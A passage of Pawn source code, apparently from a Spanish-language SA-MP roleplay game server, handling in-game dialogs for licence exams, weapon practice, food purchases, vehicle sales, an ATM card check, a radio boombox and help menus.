								enteroChar[lictipo]{playerid} = 2;
								enteroChar[licslot]{playerid} = i;
								SetPosEx(playerid, obtenerLicencia[i][cochePos][0], obtenerLicencia[i][cochePos][1], obtenerLicencia[i][cochePos][2], obtenerLicencia[i][cochePos][3], obtenerLicencia[i][cocheInterior], obtenerLicencia[i][cocheWorld]);
								PutPlayerInVehicleEx(playerid, obtenerLicencia[i][cocheExamen], 0);
								comenzarPrueba(playerid);
								pierdeDinero(playerid, 7000);
								break;
							}
						}
					}
					case 3:
					{
						if(cuenta[playerid][cLicenciaBote])return Mensaje(playerid, COLOR_ROJO, "Usted ya posee licencia de bote.");
						if(obtenerDinero(playerid) < 2500)return Mensaje(playerid, COLOR_ROJO, "No tienes para pagar el examen.");
						for(new i=0; i<sizeof(obtenerLicencia); i++)
						{
							if(obtenerLicencia[i][cocheModelo] == 473 && obtenerLicencia[i][cocheUse] == false)
							{
								obtenerLicencia[i][cocheUse] = true;
								enteroChar[lictipo]{playerid} = 3;
								enteroChar[licslot]{playerid} = i;
								SetPosEx(playerid, obtenerLicencia[i][cochePos][0], obtenerLicencia[i][cochePos][1], obtenerLicencia[i][cochePos][2], obtenerLicencia[i][cochePos][3], obtenerLicencia[i][cocheInterior], obtenerLicencia[i][cocheWorld]);
								PutPlayerInVehicleEx(playerid, obtenerLicencia[i][cocheExamen], 0);
								comenzarPrueba(playerid);
								pierdeDinero(playerid, 2500);
								break;
							}
						}
					}
				}
			}
		}
		case DIALOGO_HABILIDAD_ARMAS:
		{
			if(response)
			{
				for(new x=0;x<sizeof(habilidadArmas);x++)
				{
					if(habilidadArmas[x][hA@uso] == false)
					{
						if(enteroChar[gAnden]{playerid} != 255)return Mensaje(playerid, COLOR_GRIS2, "Ya estas en practica!");
						switch(listitem)
						{
							case 0:
							{
								if(obtenerDinero(playerid) < 200)return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente dinero!");
								habilidadArmas[x][hA@secuenciatmp] = 5;
								habilidadArmas[x][hA@exp] = 1;
								pierdeDinero(playerid, 200);
							}
							case 1:
							{
								if(obtenerDinero(playerid) < 380)return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente dinero!");
								habilidadArmas[x][hA@secuenciatmp] = 10;
								habilidadArmas[x][hA@exp] = 1;
								pierdeDinero(playerid, 380);
							}
							case 2:
							{
								if(obtenerDinero(playerid) < 760)return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente dinero!");
								habilidadArmas[x][hA@secuenciatmp] = 15;
								habilidadArmas[x][hA@exp] = 1;
								pierdeDinero(playerid, 760);
							}
							case 3:
							{
								if(cuenta[playerid][cZonaZeroCash] < 120)return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente ZZCASH!");
								habilidadArmas[x][hA@secuenciatmp] = 10;
								habilidadArmas[x][hA@exp] = 3;
								cuenta[playerid][cZonaZeroCash] -= 120;
							}
							case 4:
							{
								if(cuenta[playerid][cZonaZeroCash] < 220)return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente ZZCASH!");
								habilidadArmas[x][hA@secuenciatmp] = 20;
								habilidadArmas[x][hA@exp] = 3;
								cuenta[playerid][cZonaZeroCash] -= 220;
							}
							case 5:
							{
								if(cuenta[playerid][cZonaZeroCash] < 400)return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente ZZCASH!");
								habilidadArmas[x][hA@secuenciatmp] = 30;
								habilidadArmas[x][hA@exp] = 4;
								cuenta[playerid][cZonaZeroCash] -= 400;
							}
						}
						
						enteroChar[gAnden]{playerid} = x;
						habilidadArmas[x][hA@uso] = true;
						habilidadArmas[x][hA@armaid] = GetPlayerWeapon(playerid);
						habilidadArmas[x][hA@secuencia] = 0;
						
						SetPlayerPos(playerid, habilidadArmas[x][hA@pos][0], habilidadArmas[x][hA@pos][1], habilidadArmas[x][hA@pos][2]);
						SetPlayerTeam(playerid, 10);
						habilidadArmas[x][hA@objetoid] = CreatePlayerObject(playerid, 19825, 287.3101, habilidadArmas[x][hA@pos][1], habilidadArmas[x][hA@pos][2] + 5.0, 0.0, 0.0, 90.0, 0.0);
						MovePlayerObject(playerid, habilidadArmas[x][hA@objetoid], 287.3101, habilidadArmas[x][hA@pos][1], habilidadArmas[x][hA@pos][2] - 5.0, 1.0, 0.0, 0.0, 90.0);

						Mensaje(playerid, COLOR_VERDE, "Atento a tu objetivo!");
						Mensaje(playerid, COLOR_ROJO, "Solo puedes usar el arma con la que entraste, para sumar EXP!");
						return 1;
					}
				}
			}
			return 1;
		}
		case COMIDA_MENU:
		{
			if(response)
			{
				switch(enteroChar[dComida]{playerid})
				{
					case 1:
					{
						switch(listitem)
						{
							case 0:
							{
								if(verificarDinero(playerid, 20))
								{
									pierdeDinero(playerid, 20);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+15);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 5000, 0);
									
								}
							}
							case 1:
							{
								if(verificarDinero(playerid, 10))
								{
									pierdeDinero(playerid, 10);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+10);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 2:
							{
								if(verificarDinero(playerid, 50))
								{
									pierdeDinero(playerid, 50);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+30);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 3:
							{
								if(verificarDinero(playerid, 5))
								{
									pierdeDinero(playerid, 5);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+3);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 4:
							{
								if(verificarDinero(playerid, 100))
								{
									pierdeDinero(playerid, 100);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+40);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 5:
							{
								if(verificarDinero(playerid, 35))
								{
									pierdeDinero(playerid, 35);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+10);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
						}
					}
					case 2:
					{
						switch(listitem)
						{
							case 0:
							{
								if(verificarDinero(playerid, 30))
								{
									pierdeDinero(playerid, 30);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+10);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 1:
							{
								if(verificarDinero(playerid, 45))
								{
									pierdeDinero(playerid, 45);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+20);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 2:
							{
								if(verificarDinero(playerid, 60))
								{
									pierdeDinero(playerid, 60);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+30);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 3:
							{
								if(verificarDinero(playerid, 20))
								{
									pierdeDinero(playerid, 20);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+5);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
						}
					}
					case 3:
					{
						switch(listitem)
						{
							case 0:
							{
								if(verificarDinero(playerid, 10))
								{
									pierdeDinero(playerid, 10);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+5);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Chicken", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 1:
							{
								if(verificarDinero(playerid, 20))
								{
									pierdeDinero(playerid, 20);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+5);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Chicken", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 2:
							{
								if(verificarDinero(playerid, 40))
								{
									pierdeDinero(playerid, 40);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+20);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Chicken", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 3:
							{
								if(verificarDinero(playerid, 20))
								{
									pierdeDinero(playerid, 20);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+5);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Chicken", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
							case 4:
							{
								if(verificarDinero(playerid, 120))
								{
									pierdeDinero(playerid, 120);
									cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 50) / 100;
									new Float:Health;
									GetPlayerHealth(playerid, Health);
									GiveHP(playerid, Health+50);
									Mensaje(playerid, -1, "Gracias por su compra! Vuelva pronto!");
									ApplyAnimation(playerid, "FOOD", "EAT_Chicken", 3.0, 0, 0, 0, 0, 5000, 0);
								}
							}
						}
					}
				}
			}
		}
	    case DIALOGO_VENDER_AUTO: 
		{
	        if(response)
			{
				new carid = GetPlayerVehicleID(playerid);
		     	if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
		       	if(!EsComprable(carid))return Mensaje(playerid, COLOR_GRIS2, "No es un vehículo de venta!");

				if(carid == cuenta[playerid][cCoche])
				{
					cuenta[playerid][cCoche] = 0;
				}
				else if(carid == cuenta[playerid][cCoche2])
				{
					cuenta[playerid][cCoche2] = 0;
				}
				else if(carid == cuenta[playerid][cCoche3])
				{
					cuenta[playerid][cCoche3] = 0;
				}
				else if(carid == cuenta[playerid][cCoche4])
				{
					cuenta[playerid][cCoche4] = 0;
				}
				else return Mensaje(playerid, COLOR_ROJO, "No estas en tu vehiculo.");

				DestroyVehicle(carid);
				carid = CreateVehicleEx(400, 490.0000, -4900.0000, 1000.0000, 359.5519, 1, 1, 100);

				new cost60 = (autos[carid][cValue] * 35) / 100;
				ganaDinero(playerid, cost60);

				autos[carid][cLocationx] = 490.0000;
				autos[carid][cLocationy] = 4900.0000;
				autos[carid][cLocationz] = 1000.0000;
				autos[carid][cOwned] = 0;
				autos[carid][cBattery] = 10000;
				autos[carid][cSpoiler] = 0;
				autos[carid][cHood] = 0;
				autos[carid][cRoof] = 0;
				autos[carid][cSideskirt] = 0;
				autos[carid][cNitro] = 0;
				autos[carid][cLamps] = 0;
				autos[carid][cExhaust] = 0;
				autos[carid][cWheel] = 0;
				autos[carid][cHydraulics] = 0;
				autos[carid][cPaintjob] = 0;
				autos[carid][cFrontBumper] = 0;
				autos[carid][cRearBumper] = 0;
				autos[carid][cVents] = 0;
				autos[carid][cEmbargo] = 0;
				autos[carid][cMulta] = 0;
				
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				Mensaje(playerid, COLOR_GRIS2, "Has vendido el vehículo!");
				SetVehicleVirtualWorld(carid, 1);
				ActualizaVehiculo(carid);
				return 1;
			}
		}
		case DIALOGO_CAJERO:
		{
			if(!response) return 1;
			if(!IsNumeric(inputtext))
			{
				Mensaje(playerid, COLOR_ROJO, "Solo numeros!");
				ShowPlayerDialog(playerid, DIALOGO_CAJERO, DIALOG_STYLE_INPUT, "Tarjeta de Credito", "{ffffff}Por favor ingrese el numero de su tarjeta de credito en el siguiente espacio\n{ffffff}Ejemplo: {ff0000}123456789", "Aceptar", "Salir");
				return 1;
			}
			if(strval(inputtext) == cuenta[playerid][cTarjeta])
			{
				mostrarCajero(playerid);
				return 1;
			}
			else
			{
				Mensaje(playerid, COLOR_AMARILLO, "* Número de tarjeta erróneo, vuelve a intentarlo correctamente.");
				ShowPlayerDialog(playerid, DIALOGO_CAJERO, DIALOG_STYLE_INPUT, "Tarjeta de Credito", "{ffffff}Por favor ingrese el numero de su tarjeta de credito en el siguiente espacio\n{ffffff}Ejemplo: {ff0000}123456789", "Aceptar", "Salir");
				return 1;
			}
		}
	    case DIALOG_BOOMBOX:
      {
    	if(!response)
     	{
            Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Usted canceló el menú de su stereo.");
        	return 1;
        }
		switch(listitem)
  		{
    		case 0:
      		{
      		    ShowPlayerDialog(playerid, DIALOG_BOOMBOX1, DIALOG_STYLE_LIST, "Música Jazz", "» Smooth Jazz\n» Crooze Jazz", "Aceptar", "Cancelar");
            }
            case 1:
            {
                ShowPlayerDialog(playerid, DIALOG_BOOMBOX2, DIALOG_STYLE_LIST, "Música Pop", "» Power FM\n» CharHitz", "Aceptar", "Cancelar");
            }
            case 2:
            {
                ShowPlayerDialog(playerid, DIALOG_BOOMBOX3, DIALOG_STYLE_LIST, "Música Rap", "» RadioUP #1\n» Flow 103 Rap", "Aceptar", "Cancelar");
            }
            case 3:
            {
                ShowPlayerDialog(playerid, DIALOG_BOOMBOX4, DIALOG_STYLE_LIST, "Hip Hop", "» Hot 108 Jamz\n» The Beat #1", "Aceptar", "Cancelar");
			}
			case 4:
			{
			    ShowPlayerDialog(playerid, DIALOG_BOOMBOX5, DIALOG_STYLE_LIST, "Música Rock", "» Radio Paradise\n» Noise FM", "Aceptar", "Cancelar");
			}
			case 5:
			{
			    ShowPlayerDialog(playerid, DIALOG_BOOMBOX6, DIALOG_STYLE_LIST, "Música Country", "» 181 Kicking Country\n» Absolute Country Radio", "Aceptar", "Cancelar");
			}
			case 6:
			{
			    ShowPlayerDialog(playerid, DIALOG_BOOMBOX7, DIALOG_STYLE_INPUT, "Sistema Stereo URL", "Coloque su URL formato MP3/APL para reproducir.", "Prender", "Cancelar");
			}
			case 7:
			{
                if(GetPVarType(playerid, "BBArea"))
			    {
					format(string, sizeof(string), "* %s apagó su stereo.", PlayerName(playerid));
                    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			        for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
			            if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
			            {
			                StopStream(i);
						}
					}
			        DeletePVar(playerid, "BBStation");
				}
				Mensaje(playerid, COLOR_AZUL_CLARO, "Atención!:{FFFFFF} Apagaste tu Stereo.");
			}
        }
		return 1;
	}
	case DIALOG_BOOMBOX1://JAZZ
	{
	    if(!response)
	    {
     		ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "{32A9F5}Sistema Stereo", "» Jazz\n» Pop\n» Rap\n» R&B and Urban\n» Rock\n» Country\n» Vía URL\n» Apagar Stereo", "Aceptar", "Cancelar");
		}
		if(response)
        {
            if(listitem == 0)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=467000", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=467000");
				}
			}
		 	if(listitem == 1)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=146931", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=146931");
				}
			}
		}
		return 1;
	}
	case DIALOG_BOOMBOX2://POP
	{
	    if(!response)
	    {
            ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "Radio List", "Jazz\nPop\nRap\nR&B and Urban\nRock\nCountry\nEnter URL\nTurn Off Boombox", "Select", "Cancel");
		}
		if(response)
        {
            if(listitem == 0)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=13448", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=13448");
				}
			}
			if(listitem == 1)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=31645", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=31645");
				}
			}
		}
		return 1;
	}
	case DIALOG_BOOMBOX3://RAP
	{
	    if(!response)
	    {
     		ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "Radio List", "Jazz\nPop\nRap\nR&B and Urban\nRock\nCountry\nEnter URL\nTurn Off Boombox", "Select", "Cancel");
		}
		if(response)
        {
            if(listitem == 0)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=656213", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=656213");
				}
			}
			if(listitem == 1)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=293191", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=293191");
				}
			}
		}
		return 1;
	}
	case DIALOG_BOOMBOX4://HIP HOP
	{
	    if(!response)
	    {
     		ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "Radio List", "Jazz\nPop\nRap\nR&B and Urban\nRock\nCountry\nEnter URL\nTurn Off Boombox", "Select", "Cancel");
		}
		if(response)
        {
            if(listitem == 0)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=32999", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=32999");
				}
			}
			if(listitem == 1)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=105867", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=105867");
				}
			}
		}
		return 1;
	}
	case DIALOG_BOOMBOX5://ROCK
	{
	    if(!response)
	    {
     		ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "Radio List", "Jazz\nPop\nRap\nR&B and Urban\nRock\nCountry\nEnter URL\nTurn Off Boombox", "Select", "Cancel");
		}
		if(response)
        {
            if(listitem == 0)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=785339", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=785339");
				}
			}
   			if(listitem == 1)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=19275", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=19275");
				}
			}
		}
		return 1;
	}
	case DIALOG_BOOMBOX6://COUNTRY
	{
	    if(!response)
	    {
	       ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "Radio List", "Jazz\nPop\nRap\nR&B and Urban\nRock\nCountry\nEnter URL\nTurn Off Boombox", "Select", "Cancel");
		}
		if(response)
        {
            if(listitem == 0)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=71887", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=71887");
				}
			}
   			if(listitem == 1)
            {
                if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=34839", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=34839");
				}
			}
		}
		return 1;
	}
	case DIALOG_BOOMBOX7://SET URL
	{
		if(response == 1)
		{
		    if(isnull(inputtext))
		    {
		        Mensaje(playerid, COLOR_BLANCO, "No colocaste nada!" );
		        return 1;
		    }
		    if(strlen(inputtext))
		    {
		        if(GetPVarType(playerid, "PlacedBB"))
				{
				    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, inputtext, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
				  		}
				  	}
			  		SetPVarString(playerid, "BBStation", inputtext);
				}
			}
		}
		else
		{
		    return 1;
		}
		}
		
		case DIALOGO_TRANSPORTE_VALORES:
		{
			if(!response)return 1;
			new listed = listitem + 1;
			cuenta[playerid][selecciono] = listed;
			SetPlayerCheckpoint(playerid, trabTransportador[listed][transPos][0], trabTransportador[listed][transPos][1], trabTransportador[listed][transPos][2], 4.0);
			format(string, sizeof(string), "La posicion a ~g~%s ~w~fue marcada en su GPS.", trabTransportador[listed][transLugar]);
			TextoInformatico(10, playerid, string);
			return 1;
		}
		case SUBSIDIO:
		{
			if(response)
			{
				format(string, sizeof(string), "* %s interactuó con el cajero y seguidamente retiró el subsidio.", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
		}
        case GUIA_D:
	    {
	      if(response == 1)
	      {
        	switch(listitem)
			{
				case 0:
				{
					SetPlayerCheckpoint(playerid, 1777.1656, -1704.4020, 13.5509, 5.0);
				}
				case 1:
				{
					MostrarDialogo(playerid, "En construcción");
				}
				case 2:
				{
					MostrarDialogo(playerid, "En construcción");
				}
				case 3:
				{
					MostrarDialogo(playerid, "En construcción");
				}
				case 4:
				{
					MostrarDialogo(playerid, "En construcción.");
				}
				case 5:
				{
					MostrarDialogo(playerid, "En construcción");
				}
				case 6:
				{
					MostrarDialogo(playerid, "En construcción");
			    }
			}
		}
		else
		{

		}
	   }
        case SOPORTE_D:
	    {
	      if(response)
	      {
        	switch(listitem)
			{
				case 0:
				{
				Mensaje(playerid, -1, "Comandos ZonaZero RP:");
				Mensaje(playerid, -1, "{E48584}Comandos Administrativos:{FFFFFF} /re /duda /solicitaradmin");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /pagar /hora /id /acciones /dni /licencias /iphone /numtarjeta");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /tirar /recoger /subirnivel /inventario /estilocaminar");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /ocultarbarra /ccjugador (Contraseña) /paquete /mp /revisar");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /pasar /drogas /bmbuy /csemillas /sembrarsemilla /cosecharsemilla");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /cambiarnombre (VIP) /beneficios (VIP) /beneficios2 (VIP)");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /venderarma /conquistar /bguardar (Bovedas de Facciones)");
				Mensaje(playerid, -1, "{E48584}Comandos Generales:{FFFFFF} /pp (Primera persona) /guardarcuenta [GUARDA TUS DATOS]");
                Mensaje(playerid, -1, "{E48584}Comandos OOC:{FFFFFF} /b /c /w(hisper) /f(acción)");
				Mensaje(playerid, -1, "{E48584}Comandos IC:{FFFFFF} /g(ritar) /low /me /do /r(adio) /s(surrar)");
				Mensaje(playerid, -1, "{E48584}Comandos Tog:{FFFFFF} /tognews /togmp /togphone /togfam");
				}
				case 1:
				{
				Mensaje(playerid, -1, "Comandos ZonaZero RP:");
